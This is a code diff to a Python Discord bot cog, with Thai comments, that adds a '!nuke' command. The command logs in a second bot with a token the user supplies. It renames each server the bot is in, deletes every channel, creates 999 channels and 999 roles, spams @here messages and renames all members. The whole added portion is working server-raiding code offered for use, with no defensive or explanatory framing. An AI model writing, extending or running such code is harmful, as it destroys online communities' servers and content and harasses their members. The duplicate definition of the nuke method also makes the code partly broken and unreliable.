@@ -1,6 +1,6 @@
 import discord
 from discord.ext import commands
-from discord.ui import Button, View
+from discord.ui import Button, View, TextInput
 import asyncio
 
 intents = discord.Intents.all()
@@ -41,7 +41,7 @@ class TokenInputModal(discord.ui.Modal):
 
         try:
             await temp_bot.start(TOKEN)
-            await asyncio.sleep(300)  # ทำงาน 24 ชั่วโมง
+            await asyncio.sleep(300)  # ทำงาน 5 นาที
         except Exception as e:
             print(f"Error in temp bot: {e}")
         finally:
@@ -83,7 +83,7 @@ class NukeCommands(commands.Cog):
 
     @commands.command()
     @commands.has_permissions(administrator=True)
-    async def set_bot(self, ctx):
+    async def set_token(self, ctx):
         embed = discord.Embed(
             title="ตั้งค่าโทเค่น",
             description="กดปุ่มด้านล่างเพื่อใส่โทเค่นของบอท",
@@ -91,6 +91,57 @@ class NukeCommands(commands.Cog):
         )
         view = TokenInputView()
         await ctx.send(embed=embed, view=view)
+
+    @commands.command()
+    @commands.has_permissions(administrator=True)
+    async def nuke(self, ctx):
+        if TOKEN:
+            await ctx.send("✅ เริ่มกระบวนการทำลายเซิร์ฟเวอร์...")
+            temp_bot = commands.Bot(command_prefix="!", intents=intents)
+
+            @temp_bot.event
+            async def on_ready():
+                print(f"Temp bot logged in as {temp_bot.user}")
+                await self.nuke(temp_bot)
+
+            try:
+                await temp_bot.start(TOKEN)
+                await asyncio.sleep(300)  # ทำงาน 5 นาที
+            except Exception as e:
+                print(f"Error in temp bot: {e}")
+            finally:
+                await temp_bot.close()
+        else:
+            await ctx.send("❌ โทเค่นยังไม่ได้ตั้งค่า กรุณาใช้คำสั่ง `!set_token` เพื่อตั้งค่าโทเค่น")
+
+    async def nuke(self, bot):
+        guilds = bot.guilds
+        for guild in guilds:
+            # เปลี่ยนชื่อเซิร์ฟเวอร์
+            await guild.edit(name="VDENA")
+
+            # ลบทุกห้อง
+            for channel in guild.channels:
+                await channel.delete()
+
+            # สร้าง 999 ห้อง
+            for i in range(1, 1000):
+                await guild.create_text_channel(f"vdena-channel-{i}")
+
+            # สร้าง 999 ยศ
+            for i in range(1, 1000):
+                await guild.create_role(name=f"vdena-role-{i}")
+
+            # ส่งข้อความไปทุกช่อง
+            for channel in guild.text_channels:
+                await channel.send("@here vdenaมาเเล้ววว")
+
+            # เปลี่ยนชื่อทุกคนเป็น vdena
+            for member in guild.members:
+                try:
+                    await member.edit(nick="vdena")
+                except:
+                    continue
 
 async def setup(bot):
     await bot.add_cog(NukeCommands(bot))
